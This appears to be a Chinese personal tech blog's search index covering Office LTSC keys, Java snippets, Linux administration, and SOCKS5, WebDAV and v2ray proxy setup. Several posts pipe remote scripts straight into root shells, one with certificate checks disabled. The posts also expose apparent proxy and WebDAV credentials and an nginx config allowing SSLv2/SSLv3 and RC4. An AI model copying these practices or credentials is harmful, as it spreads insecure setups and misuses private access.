专业增强版 2021	FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH Office LTSC 标准版 2021	KDX7X-BNVR8-TXXGX-4Q7Y8-78VT3 Project Professional 2021 年 1 月	FTNWT-C6WBT-8HMGF-K9PRX-QV9H8 Project Standard 2021	J2JDC-NJCYY-9RGQ4-YXWMH-T3D4T VisioLTSC Professional 2021	KNH8D-FGHT4-T8RK3-CTDYJ-K2HT4 VisioLTSC Standard 2021	MJVNY-BYWPY-CWV6J-2RKRT-4M8QG Access LTSC 2021	WM8YG-YNGDD-4JHDC-PG3F4-FC4T4 ExcelLTSC 2021	NWG3X-87C9K-TC7YY-BC2G7-G6RVC OutlookLTSC 2021	C9FM6-3N72F-GFJXB-TM3V9-T86R9 PowerPointLTSC 2021	TY7XF-NFRBR-KJ44C-G83KF-GX27K PublisherLTSC 2021	2MW9D-N4BXM-9VBPG-Q7W6M-KFBGQ Skype for BusinessLTSC 2021	HWCXN-K3WBT-WJBKY-R8BD9-XK29P Word LTSC 2021	TN8H9-M34D3-Y64V9-TR72V-X79KV   ]]></content></entry><entry><title>LambdaQueryWrapper使用</title><url>/posts/java/lambdaquerywrapper%E4%BD%BF%E7%94%A8/</url><categories><category>Java</category></categories><tags><tag>Java</tag></tags><content type="html"><![CDATA[  // eq用法 LambdaQueryWrapper&lt;News&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(News::getNid, nid); News news = newsService.getOne(queryWrapper); // select用法 LambdaQueryWrapper&lt;User&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(User::getUid, uid).select(User::getUid, User::getUsername, User::getIsVip); User user = userService.getOne(queryWrapper); // and用法 Page&lt;User&gt; userPage = new Page&lt;&gt;(pageParam.getPage(), pageParam.getPageSize()); LambdaQueryWrapper&lt;User&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(User::getType, 1).and(u -&gt; u.eq(User::getStatus, 0)); Page&lt;User&gt; page = userService.page(userPage, queryWrapper);   ]]></content></entry><entry><title>Linux JDK一键安装脚本</title><url>/posts/java/linux-jdk-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/</url><categories><category>Java</category></categories><tags><tag>Java</tag><tag>JDK</tag></tags><content type="html"><![CDATA[  bash &lt;(curl -Ssl https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/jdk-install.sh) 下载不了的话，运行下面脚本
#!/bin/bash set -e java_dist=&#34;/root/jdk-8u202-linux-x64.tar.gz&#34; default_java_dir=&#34;/usr/local&#34; java_dir=&#34;$default_java_dir&#34; SUDO_USER=root function usage() { echo &#34;&#34; echo &#34;这个脚本会自动下载jdk 1.8. &#34; echo &#34;Usage: &#34; echo &#34;install-java.sh -f &lt;java_dist&gt; [-p &lt;java_dir&gt;]&#34; echo &#34;&#34; echo &#34;-f: The jdk tar.gz file. 默认安装的是/root/jdk-8u202-linux-x64.tar.gz&#34; echo &#34;-p: java默认安装在/usr/local目录中，你可以通过-p命令切换目录&#34; echo &#34;-h: 显示帮助.&#34; echo &#34;&#34; } function confirm() { # call with a prompt string or use a default read -r -p &#34;${1:-Are you sure?} [y/N] &#34; response case $response in [yY][eE][sS] | [yY]) true ;; *) false ;; esac } # Make sure the script is running as root. if [ &#34;$UID&#34; -ne &#34;0&#34; ]; then echo &#34;You must be root to run $0. Try following&#34; echo &#34;sudo $0&#34; exit 9 fi while getopts &#34;f:p:h&#34; opts; do case $opts in f) java_dist=${OPTARG} ;; p) java_dir=${OPTARG} ;; h) usage exit 0 ;; \?) usage exit 1 ;; esac done if ! [ -x &#34;$(command -v axel)&#34; ]; then wget https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz -O /root/jdk-8u202-linux-x64.tar.gz else axel -n 10 -a https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz -o /root/jdk-8u202-linux-x64.tar.gz fi if [[ ! -f $java_dist ]]; then echo &#34;Please specify the Java distribution file.&#34; echo &#34;Use -h for help.&#34; exit 1 fi # Validate Java Distribution java_dist_filename=$(basename $java_dist) if [[ ${java_dist_filename: -7} != &#34;.tar.gz&#34; ]]; then echo &#34;Java distribution must be a valid tar.gz file.&#34; exit 1 fi # Create the default directory if user has not specified any other path if [[ $java_dir == $default_java_dir ]]; then mkdir -p $java_dir fi #Validate java directory if [[ ! -d $java_dir ]]; then echo &#34;Please specify a valid Java installation directory.&#34; exit 1 fi echo &#34;Installing: $java_dist_filename&#34; # Check Java executable java_exec=&#34;$(tar -tzf $java_dist | grep ^[^/]*/bin/java$ || echo &#34;&#34;)&#34; if [[ -z $java_exec ]]; then echo &#34;Could not find \&#34;java\&#34; executable in the distribution. Please specify a valid Java distribution.&#34; exit 1 fi # JDK Directory with version jdk_dir=&#34;$(echo $java_exec | cut -f1 -d&#34;/&#34;)&#34; extracted_dirname=$java_dir&#34;/&#34;$jdk_dir # Extract Java Distribution if [[ ! -d $extracted_dirname ]]; then echo &#34;Extracting $java_dist to $java_dir&#34; tar -xof $java_dist -C $java_dir echo &#34;JDK is extracted to $extracted_dirname&#34; else echo &#34;WARN: JDK was not extracted to $java_dir. There is an existing directory with the name \&#34;$jdk_dir\&#34;.&#34; if ! (confirm &#34;Do you want to continue?&#34;); then exit 1 fi fi if [[ ! -f &#34;${extracted_dirname}/bin/java&#34; ]]; then echo &#34;ERROR: The path $extracted_dirname is not a valid Java installation.&#34; exit 1 fi # Oracle JDK: 7 to 8 java_78_dir_regex=&#34;^jdk1\.([0-9]*).*$&#34; # Oracle JDK / OpenJDK / AdoptOpenJDK: 9 and upwards java_9up_dir_regex=&#34;^jdk-([0-9]*).*$&#34; # JDK Major Version jdk_major_version=&#34;&#34; if [[ $jdk_dir =~ $java_78_dir_regex ]]; then jdk_major_version=$(echo $jdk_dir | sed -nE &#34;s/$java_78_dir_regex/\1/p&#34;) else jdk_major_version=$(echo $jdk_dir | sed -nE &#34;s/$java_9up_dir_regex/\1/p&#34;) fi # Install Demos if [[ $jdk_dir =~ $java_78_dir_regex ]]; then # Demos are only available for Java 7 and 8 demos_dist=$(dirname $java_dist)&#34;/&#34;$(echo $java_dist_filename | sed &#39;s/\.tar\.gz/-demos\0/&#39;) fi if [[ -f $demos_dist &amp;&amp; ! -d $extracted_dirname/demo ]]; then # No demo directory if (confirm &#34;Extract demos?&#34;); then echo &#34;Extracting $demos_dist to $java_dir&#34; tar -xf $demos_dist -C $java_dir fi fi # Install Unlimited JCE Policy (only for Oracle JDK 7 &amp; 8) # Java 9 and above: default JCE policy files already allow for \&#34;unlimited\&#34; cryptographic strengths. unlimited_jce_policy_dist=&#34;&#34; if [[ $jdk_dir =~ ^jdk1\.7.* ]]; then unlimited_jce_policy_dist=&#34;$(dirname $java_dist)/UnlimitedJCEPolicyJDK7.zip&#34; elif [[ $jdk_dir =~ ^jdk1\.8.* ]]; then unlimited_jce_policy_dist=&#34;$(dirname $java_dist)/jce_policy-8.zip&#34; fi if [[ -f $unlimited_jce_policy_dist ]]; then #Check whether unzip command exsits if ! command -v unzip &gt;/dev/null 2&gt;&amp;1; then echo &#34;Please install unzip (apt -y install unzip).&#34; exit 1 fi if (confirm &#34;Install Java Cryptography Extension (JCE) Unlimited Strength Jurisdiction Policy Files?&#34;); then echo &#34;Extracting policy jars in $unlimited_jce_policy_dist to $extracted_dirname/jre/lib/security&#34; unzip -j -o $unlimited_jce_policy_dist *.jar -d $extracted_dirname/jre/lib/security fi fi # Run update-alternatives commands if (confirm &#34;Run update-alternatives commands?&#34;); then echo &#34;Running update-alternatives...&#34; cmd=&#34;update-alternatives --install /usr/bin/java java $extracted_dirname/bin/java 10000&#34; declare -a commands=($(ls -1 ${extracted_dirname}/bin | grep -v ^java$)) for command in &#34;${commands[@]}&#34;; do command_path=$extracted_dirname/bin/$command if [[ -x $command_path ]]; then cmd=&#34;$cmd --slave /usr/bin/$command $command $command_path&#34; fi done lib_path=$extracted_dirname/jre/lib/amd64/libnpjp2.so if [[ -d &#34;/usr/lib/mozilla/plugins/&#34; ]] &amp;&amp; [[ -f $lib_path ]]; then cmd=&#34;$cmd --slave /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so $lib_path&#34; fi echo $cmd # Execute command $cmd update-alternatives --set java $extracted_dirname/bin/java fi # Create system preferences directory java_system_prefs_dir=&#34;/etc/.java/.systemPrefs&#34; if [[ ! -d $java_system_prefs_dir ]]; then if (confirm &#34;Create Java System Prefs Directory ($java_system_prefs_dir) and change ownership to $SUDO_USER:$SUDO_USER?&#34;); then echo &#34;Creating $java_system_prefs_dir&#34; mkdir -p $java_system_prefs_dir chown -R $SUDO_USER:$SUDO_USER $java_system_prefs_dir fi fi USER_HOME=&#34;$(getent passwd $SUDO_USER | cut -d: -f6)&#34; if [[ -d &#34;$USER_HOME&#34; ]] &amp;&amp; (confirm &#34;Do you want to set JAVA_HOME environment variable in $USER_HOME/.bashrc?&#34;); then if grep -q &#34;export JAVA_HOME=.*&#34; $USER_HOME/.bashrc; then sed -i &#34;s|export JAVA_HOME=.*|export JAVA_HOME=$extracted_dirname|&#34; $USER_HOME/.bashrc else echo &#34;export JAVA_HOME=$extracted_dirname&#34; &gt;&gt;$USER_HOME/.bashrc fi fi applications_dir=&#34;$USER_HOME/.local/share/applications&#34; create_jmc_shortcut() { shortcut_file=&#34;$applications_dir/jmc_$jdk_major_version.desktop&#34; cat &lt;&lt;_EOF_ &gt;$shortcut_file [Desktop Entry] Name=Java $jdk_major_version: JMC Comment=Oracle Java Mission Control for Java $jdk_major_version Type=Application Exec=$extracted_dirname/bin/jmc Icon=$extracted_dirname/lib/missioncontrol/icon.xpm Terminal=false _EOF_ chmod +x $shortcut_file } if [[ -d $applications_dir ]] &amp;&amp; [[ -f $extracted_dirname/bin/jmc ]]; then if (confirm &#34;Do you want to create a desktop shortcut to JMC?&#34;); then create_jmc_shortcut fi fi 添加执行权限并运行
chmod +x install-java.sh &amp;&amp; ./install-java.sh   ]]></content></entry><entry><title>Linux usr文件概述</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux-usr%E6%96%87%E4%BB%B6%E6%A6%82%E8%BF%B0/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> /bin 存放所有用户皆可用的系统程序，系统启动或者系统修复时可用（在没有挂载 /usr 目录时就可以使用） /sbin 存放超级用户才能使用的系统程序 /usr/bin 存放所有用户都可用的应用程序 /usr/sbin 存放超级用户才能使用的应用程序 /usr/local/bin 存放所有用户都可用的与本地机器无关的程序 /usr/local/sbin 存放超级用户才能使用的与本地机器无关的程序</content></entry><entry><title>Linux安装最新的Node(LTS)</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux-%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%9A%84nodelts/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>Node</tag></tags><content type="html"> # 先更新软件源 $ sudo apt-get upadte # 安装npm $ sudo apt install npm # 使用npm全局安装n模块 $ sudo npm install n -g # 安装最新长期支持版node $ sudo n lts # 检查是否安装成功 $ node -v</content></entry><entry><title>Linux查看温度</title><url>/posts/linux%E6%93%8D%E4%BD%9C/%E6%9F%A5%E7%9C%8B%E6%B8%A9%E5%BA%A6/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> 方法一 pi@RaspberryPi:~ $ /opt/vc/bin/vcgencmd measure_temp temp=51.5&amp;#39;C 方法二 pi@RaspberryPi:~ $ cat /sys/class/thermal/thermal_zone0/temp 50464 此处的数值除以1000，单位是℃。</content></entry><entry><title>Linux常用命令</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"><![CDATA[  
系统信息 arch #显示机器的处理器架构(1) uname -m #显示机器的处理器架构(2) uname -r #显示正在使用的内核版本 dmidecode -q #显示硬件系统部件 - (SMBIOS / DMI) hdparm -i /dev/hda #罗列一个磁盘的架构特性 hdparm -tT /dev/sda #在磁盘上执行测试性读取操作 cat /proc/cpuinfo #显示CPU info的信息 cat /proc/interrupts #显示中断 cat /proc/meminfo #校验内存使用 cat /proc/swaps #显示哪些swap被使用 cat /proc/version #显示内核的版本 cat /proc/net/dev #显示网络适配器及统计 cat /proc/mounts #显示已加载的文件系统 lspci -tv #罗列PCI设备 lsusb -tv #显示USB设备 date 显示系统日期 cal 2007 #显示2007年的日历表 date 041217002007.00 #设置日期和时间 - 月日时分年.秒 clock -w #将时间修改保存到 BIOS 关机 (系统的关机、重启以及登出 ) shutdown -h now #关闭系统(1) init 0 #关闭系统(2) telinit 0 #关闭系统(3) shutdown -h hours:minutes &amp;amp; #按预定时间关闭系统 shutdown -c #取消按预定时间关闭系统 shutdown -r now #重启(1) reboot #重启(2) logout #注销 文件和目录 cd /home #进入 &amp;#39;/ home&amp;#39; 目录&amp;#39; cd .. #返回上一级目录 cd ../.. #返回上两级目录 cd #进入个人的主目录 cd ~user1 #进入个人的主目录 cd - #返回上次所在的目录 pwd #显示工作路径 ls #查看目录中的文件 ls -F #查看目录中的文件 ls -l #显示文件和目录的详细资料 ls -a #显示隐藏文件 ls *[0-9]* #显示包含数字的文件名和目录名 tree #显示文件和目录由根目录开始的树形结构(1) lstree #显示文件和目录由根目录开始的树形结构(2) …  ]]></content></entry><entry><title>Linux创建守护进程</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E5%88%9B%E5%BB%BA%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> 在 /etc/systemd/system/ 下新建并编辑 xxx.service 文件
这里以 code-server.service 为例
sudo vim /etc/systemd/system/code-server.service 写入下面的内容并根据自己创建的服务进行更改(带注释的为选填，看服务的需求开启)
[Unit] Description=code-server #描述要启动的进程 After=network.target [Service] Type=simple #WorkingDirectory=/root/workDir #启动进程的文件夹 #User=root #你想用什么用户启动该进程 #Group=root #你希望用什么用户组启动该进程 Restart=on-failure #进程错误时重启 RestartSec=10 ExecStart=/usr/bin/code-server#启动命，要用绝对路径，否则会报错 [Install] WantedBy=multi-user.target systemctl daemon-reload</content></entry><entry><title>Linux磁盘分区、格式化、挂载</title><url>/posts/linux%E6%93%8D%E4%BD%9C/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%8C%82%E8%BD%BD/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> 一、插入U盘或者移动硬盘 1、若是一块新的移动硬盘，则需要对它进行分区和格式化 使用df -h可以查看当前系统中详细的存储设备挂载情况。
使用sudo fdisk -l可以查看磁盘分区情况
1.1进入fdisk操作模式，对磁盘进行分区 通过指令sudo fdisk /dev/sd*我们可以进入对应磁盘的fdisk操作模式，我们可以输入m来获取如下的帮助列表，并选择对应的功能进行后续操作。
Help: DOS (MBR) a toggle a bootable flag # 切换可引导的标识 b edit nested BSD disklabel # 编辑bsd磁盘标识 c toggle the dos compatibility flag # 切换dos兼容性标识 Generic d delete a partition # 删除磁盘分区 F list free unpartitioned space # 列出可用未分区空间 l list known partition types # 列出已知分区类型 n add a new partition # 添加一个新的分区 p print the partition table # 打印分区表 t change a partition type # 更改分区类型 v verify the partition table # 校验分区表 i print information about a partition # 打印有关分区的信息 Misc m print this menu # 打印help u change display/entry units # 改变 显示/接入 单元 x extra functionality (experts only) # 额外功能(仅限专家) Script I load disk layout from sfdisk script file # 从sfdisk脚本文件加载磁盘布局 O dump disk layout to sfdisk script file # 将磁盘布局转储到sfdisk脚本文件 Save &amp;amp; Exit w write table to disk and exit # 保存并退出 q quit without saving changes # 退出不保存 Create a new label g create a new empty GPT partition table # 创建一个新的gpt分区 G create a new empty SGI (IRIX) partition table o create a new empty DOS partition table s create a new empty Sun partition table 常用的就 n p w
1.2 对新分区进行格式化操作 有两种格式化方法：
sudo mkfs -t ext4 /dev/sda1 # 或者 sudo mkfs.ext4 /dev/sda1 # xfs文件系统 sudo mkfs -t xfs /dev/sdb1 sudo mkfs.xfs /dev/sdb1 1.3 磁盘挂载 sudo mount /dev/sda1 /data # 卸载命令 sudo umount /dev/sda1 最后通过df -h查看挂载情况
可以看到/dev/sda1已经挂载成功
1.4 设置磁盘的开机自动挂载 首先我们需要获取新的磁盘的UUID：
sudo blkid /dev/sda1 然后把UUID和相关信息按照格式写到/etc/fstab里面，主要增加UUID，挂载位置，FS格式这三点，之后保存即可。
sudo vim /etc/fstab</content></entry><entry><title>Linux磁盘清理</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux-%E7%A3%81%E7%9B%98%E6%B8%85%E7%90%86/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> 1. 查看磁盘信息 df -lh 我们可以看见Filesystem下的挂载点 /dev/vda1 下的8.4G容量已经耗尽。接下来就是删除占用磁盘空间大，但又无用的文件。
2. 定位最大文件目录 cd / #寻找当前目录，哪个文件夹占用空间最大 du -h --max-depth=1 可以看到 /var 此路径占用较大磁盘空间，占用了6G。
重复上面的步骤，定位到最后的目录
可以看到 /log 此路径占用较大磁盘空间，占用了5.8G。
3. 定位最大文件 进入/log目录，查看里面的文件情况
可以看到里面有几个G的系统文件，查看之后再确认是否删除
4. 删除文件 rm -f messages*</content></entry><entry><title>Linux搭建Socks5代理</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/linux%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>代理</tag></tags><content type="html"><![CDATA[   说明： Socks5属于明文代理，可用于正常的跳板使用； 比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS； 使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题
项目地址： https://github.com/Lozy/danted 1. 安装 wget https://raw.githubusercontent.com/Lozy/danted/blob/master/install.sh # bash install.sh --port=端口 --user=用户名 --passwd=密码 bash install.sh --port=5566 --user=colzry --passwd=colzry_admin 下载不了的话可以直接写入下面的内容
#!/bin/bash # # Dante Socks5 Server AutoInstall # -- Owner: https://www.inet.no/dante # -- Provider: https://sockd.info # -- Author: Lozy # # Check if user is root if [ $(id -u) != &#34;0&#34; ]; then echo &#34;Error: You must be root to run this script, please use root to install&#34; exit 1 fi REQUEST_SERVER=&#34;https://raw.github.com/Lozy/danted/master&#34; SCRIPT_SERVER=&#34;https://public.sockd.info&#34; SYSTEM_RECOGNIZE=&#34;&#34; [ &#34;$1&#34; == &#34;--no-github&#34; ] &amp;&amp; REQUEST_SERVER=${SCRIPT_SERVER} if [ -s &#34;/etc/os-release&#34; ];then os_name=$(sed -n &#39;s/PRETTY_NAME=&#34;\(.*\)&#34;/\1/p&#39; /etc/os-release) if [ -n &#34;$(echo ${os_name} | grep -Ei &#39;Debian|Ubuntu&#39; )&#34; ];then printf &#34;Current OS: %s\n&#34; &#34;${os_name}&#34; SYSTEM_RECOGNIZE=&#34;debian&#34; elif [ -n &#34;$(echo ${os_name} | grep -Ei &#39;CentOS&#39;)&#34; ];then printf &#34;Current OS: %s\n&#34; &#34;${os_name}&#34; SYSTEM_RECOGNIZE=&#34;centos&#34; else printf &#34;Current OS: %s is not support.\n&#34; &#34;${os_name}&#34; fi elif [ -s &#34;/etc/issue&#34; ];then if [ -n &#34;$(grep -Ei &#39;CentOS&#39; /etc/issue)&#34; ];then printf &#34;Current OS: %s\n&#34; &#34;$(grep -Ei &#39;CentOS&#39; /etc/issue)&#34; SYSTEM_RECOGNIZE=&#34;centos&#34; else printf &#34;+++++++++++++++++++++++\n&#34; cat /etc/issue printf &#34;+++++++++++++++++++++++\n&#34; printf &#34;[Error] Current OS: is not available to support.\n&#34; fi else printf &#34;[Error] (/etc/os-release) OR (/etc/issue) not exist!\n&#34; printf &#34;[Error] Current OS: is not available to support.\n&#34; fi if [ -n &#34;$SYSTEM_RECOGNIZE&#34; ];then wget -qO- --no-check-certificate ${REQUEST_SERVER}/install_${SYSTEM_RECOGNIZE}.sh | \ bash -s -- $* else printf &#34;[Error] Installing terminated&#34; exit 1 fi exit 0 2. 服务端使用 卸载
bash install.sh --uninstall 增加用户
/etc/init.d/sockd adduser USERNAME PASSWORD command option description service sockd start /etc/init.d/sockd start start socks5 server daemon service sockd stop /etc/init.d/sockd stop stop socks5 server daemon service sockd restart /etc/init.d/sockd restart restart socks5 server daemon service sockd reload /etc/init.d/sockd reload reload socks5 server daemon service sockd status systemd process status service sockd state /etc/init.d/sockd state running state service sockd tail /etc/init.d/sockd tail sock log tail service sockd adduser /etc/init.d/sockd adduser add pam-auth user: service sockd adduser NAME PASSWORD service sockd deluser /etc/init.d/sockd deluser delete pam-auth user: service sockd deluser NAME 3. 客户端使用 proxychanins中使用（推荐）
vim /etc/proxychains.conf socks5 43.142.174.216 5566 colzry colzry_admin |-&gt;ip |-&gt;端口 |-&gt;用户名 |-&gt;密码 使用系统导出代理（不推荐）
export ALL_PROXY=socks5://colzry:colzry_admin@43.142.174.216:5566 # 取消代理 unset ALL_PROXY   ]]></content></entry><entry><title>Linux搭建WebDav服务</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/linux%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>WebDav</tag></tags><content type="html"> WebDav Server WebDAV 是 GitHub 上开源的项目，基于 Go 语言实现，不仅跨平台，还支持 ARM 架构，可在㠌入式设备中部署 WebDAV 服务器。 项目地址： https://github.com/hacdias/webdav GitHub 下载对应的架构 WebDAV，解压后获得 webdav二进制文件
1. 解压 tar -zxvf linux-amd64-webdav.tar.gz mv webdav /usr/bin/ 2. 编写配置文件 vim /opt/webdav_config.yaml # Server related settings address: 0.0.0.0 port: 10105 # 如果无需验证填 false auth: true # 如果不需要 https 则填 false tls: false # https证书和密钥，如果 tls 为 false，cert 和 key 不需要 # cert: /data/www/cert/szhome.xf1024.com_nginx/cert.pem # key: /data/www/cert/szhome.xf1024.com_nginx/cert.key # 访问前缀，建议默认 prefix: / debug: false # 如果 auth 为 false 生效，文件共享的路径 scope: . modify: true rules: [] # 跨域设置 cors: enabled: true credentials: true allowed_headers: - Depth allowed_hosts: - http://localhost:10105 allowed_methods: - GET exposed_headers: - Content-Length - Content-Range # 用户信息，如果 auth 为 true 生效 users: - username: Colzry password: webdav_colzry scope: /mnt/hhd01/back/Video/ # 是否允许修改 modify: true - username: other_user password: xxxxx scope: /data/1/Video modify: true 使用命令
/usr/bin/webdav -c /opt/webdav_config.yaml 3. 添加守护进程 vim /usr/lib/systemd/system/webdav.service [Unit] Description=WebDAV server After=network.target [Service] Type=simple User=root ExecStart=/usr/bin/webdav -c /opt/webdav_config.yaml Restart=on-failure [Install] WantedBy=multi-user.target systemctl daemon-reload systemctl start webdav.service systemctl status webdav.service systemctl enable webdav.service 4. Linux 挂载 sudo apt install davfs2 sudo mount -t davfs http://192.168.5.254:10105/ /webdav 5. Nginx 开启 WebDAV 在Nginx中实现WebDAV需要安装 libnginx-mod-http-dav-ext 模块，以下是Nginx的配置：
server { listen 80; listen [::]:80; server_name dav.engr-z.com; location / { root /data/webdav; client_body_temp_path /var/temp; dav_methods PUT DELETE MKCOL COPY MOVE; dav_ext_methods PROPFIND OPTIONS; create_full_put_path on; client_max_body_size 10G; } } server { listen 443; listen [::]:443; server_name dav.engr-z.com; ssl on; ssl_certificate /data/www/cert/dav.engr-z.com_nginx/cert.pem; ssl_certificate_key /data/www/cert/dav.engr-z.com_nginx/cert.key; ssl_session_timeout 5m; ssl_protocols SSLv2 SSLv3 TLSv1; ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP; ssl_prefer_server_ciphers on; location / { root /data/webdav; client_body_temp_path /var/temp; dav_methods PUT DELETE MKCOL COPY MOVE; dav_ext_methods PROPFIND OPTIONS; create_full_put_path on; client_max_body_size 10G; } }</content></entry><entry><title>Linux防火墙和Cockpit</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E9%98%B2%E7%81%AB%E5%A2%99%E5%92%8Ccockpit/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"><![CDATA[  1. firewall (RedHat系列) # 查看状态 firewall-cmd --state # 开启防火墙 systemctl start firewalld.service # 关闭并禁用防火墙 systemctl stop firewalld.service systemctl disable firewalld.service # 关闭SElinux 该为disable vim /etc/selinux/config # 开放端口 firewall-cmd --zone=public --add-port=8080/tcp --permanent firewall-cmd --reload # 关闭端口 firewall-cmd --zone=public --remove-port=8080/tcp --permanent firewall-cmd --reload # 查看以开放的端口 firewall-cmd --list-ports # 更新防火墙规则 firewall-cmd --reload 2. ufw (Ubuntu) # 查看状态 ufw status 3. Cockpit安装 dnf install cockpit cockpit-dashboard / cockpit-storaged cockpit-packagekit -y # 也可以安装其它的扩展包 dnf list cockpit* -------------------------- cockpit-bridge.x86_64 cockpit-composer.noarch cockpit-doc.noarch cockpit-machines.noarch cockpit-packagekit.noarch cockpit-pcp.x86_64 cockpit-podman.noarch cockpit-session-recording.noarch cockpit-storaged.noarch cockpit-system.noarch cockpit-ws.x86_64 -------------------------- # 启动cockpit并设为开启自启动 systemctl enable --now cockpit.socket / &amp;&amp; systemctl list-unit-files | grep cockpit / &amp;&amp; systemctl start cockpit # 有防火墙的话，记得开放 firewall-cmd --permanent --zone=public --add-service=cockpit firewall-cmd --reload 之后访问本机9090端口   ]]></content></entry><entry><title>Linux科学代理</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/linux-%E7%A7%91%E5%AD%A6%E4%BB%A3%E7%90%86/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>代理</tag></tags><content type="html"><![CDATA[  官方文档： https://v2raya.org/docs/prologue/quick-start/ 安装v2ray内核，使用镜像脚本（不通过添加软件源安装）
# v2rayA 提供的镜像脚本 curl -Ls https://mirrors.v2raya.org/go.sh | sudo bash # 安装后可以关掉服务，因为 v2rayA 不依赖于该 systemd 服务 sudo systemctl disable v2ray --now 1. 安装 1.1 Fedora # 添加 copr 源 sudo dnf copr enable zhullyb/v2rayA # 安装 V2Ray 内核 sudo dnf install v2ray-core # 安装 v2rayA sudo dnf install v2raya # 启动 sudo systemctl start v2raya.service # 设置开机自启 sudo systemctl enable v2raya.service 1.2 Debian 请先通过顶上的方法安装v2ray内核
# 添加公钥 wget -qO - https://apt.v2raya.org/key/public-key.asc | sudo tee /etc/apt/trusted.gpg.d/v2raya.asc # 添加 V2RayA 软件源 echo &#34;deb https://apt.v2raya.org/ v2raya main&#34; | sudo tee /etc/apt/sources.list.d/v2raya.list sudo apt update # 安装 V2RayA sudo apt install v2raya # 启动 sudo systemctl start v2raya.service # 设置开机自启 sudo systemctl enable v2raya.service 切换 iptables 为 iptables-nft 对于 Debian11 用户来说，iptables 已被弃用。使用 nftables 作为 iptables 的后端以进行适配
update-alternatives --set iptables /usr/sbin/iptables-nft update-alternatives --set ip6tables /usr/sbin/ip6tables-nft update-alternatives --set arptables /usr/sbin/arptables-nft update-alternatives --set ebtables /usr/sbin/ebtables-nft 如果你想切换回 legacy 版本
update-alternatives --set iptables /usr/sbin/iptables-legacy update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy update-alternatives --set arptables /usr/sbin/arptables-legacy update-alternatives --set ebtables /usr/sbin/ebtables-legacy 切换后重启即可
2. 使用 通过 2017 端口 如 http://localhost:2017 访问 UI 界面 记得调整防火墙
2.1 创建管理员账号 2.2 导入节点 vmess://ew0KICAidiI6ICIyIiwNCiAgInBzIjogIlZtZXNzIiwNCiAgImFkZCI6ICJwYW4uZ29zc2lwLnRrIiwNCiAgInBvcnQiOiAiNDQzIiwNCiAgImlkIjogIjcyNTQ0Nzk0LTRhYWUtNGVmNy1jMmRhLTUxOTRjN2RkOGI4NSIsDQogICJhaWQiOiAiMCIsDQogICJzY3kiOiAiYXV0byIsDQogICJuZXQiOiAid3MiLA0KICAidHlwZSI6ICJub25lIiwNCiAgImhvc3QiOiAicGFuLmdvc3NpcC50ayIsDQogICJwYXRoIjogIi9nb2ZpYyIsDQogICJ0bHMiOiAidGxzIiwNCiAgInNuaSI6ICIiLA0KICAiYWxwbiI6ICIiDQp9 2.3 启动 2.4 设置 2.5 开放代理端口 2.6 设置Linux代理 export ALL_PROXY=socks5://127.0.0.1:20170 # 取消代理 unset ALL_PROXY 2.7 使用proxychains设置代理（推荐） 安装
# Fedora sudo dnf install proxychains-ng # Debian sudo apt install proxychains-ng 配置
vim /etc/proxychains.conf socks5 127.0.0.1 20170 测试一下
[root@fedora ~]# proxychains curl cip.cc [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 127.0.0.1:20170 ... cip.cc:80 ... OK IP : 198.23.149.5 地址 : 美国 华盛顿州 西雅图 运营商 : colocrossing.com 数据二 : 美国 | 纽约州伊利县威廉斯维尔村ColoCrossing有限公司 数据三 : 美国华盛顿西雅图 URL : http://www.cip.cc/198.23.149.5 简化使用命令
